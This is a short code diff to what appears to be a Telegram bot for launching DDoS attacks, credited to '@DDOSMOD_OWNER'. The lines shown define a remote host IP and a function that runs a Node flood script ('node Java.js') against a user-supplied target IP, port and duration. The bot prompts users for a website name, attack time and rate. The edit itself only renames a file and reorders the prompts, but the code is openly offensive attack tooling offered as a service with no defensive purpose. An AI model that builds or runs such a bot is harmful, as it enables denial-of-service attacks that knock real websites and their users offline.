@@ -35,7 +35,7 @@ running_processes = []
 
 REMOTE_HOST = '4.213.71.147'  
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"node java.js {target_ip} {duration} {target_port} 10 https.txt"
+    command = f"node Java.js {target_ip} {duration} {target_port} 10 https.txt"
     try:
        
         process = await asyncio.create_subprocess_shell(
@@ -139,7 +139,7 @@ def attack_command(message):
         return
 
     try:
-        bot.send_message(chat_id, "*Enter the Websites Name\n\n Enter A Rate\n\n Time (in seconds)\n\n Devloped By :- @DDOSMOD_OWNER*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*Enter the Websites Name\n\n Time (in seconds)\n\n Enter A Rate\n\n Devloped By :- @DDOSMOD_OWNER*", parse_mode='Markdown')
         bot.register_next_step_handler(message, process_attack_command)
     except Exception as e:
         logging.error(f"Error in attack command: {e}")
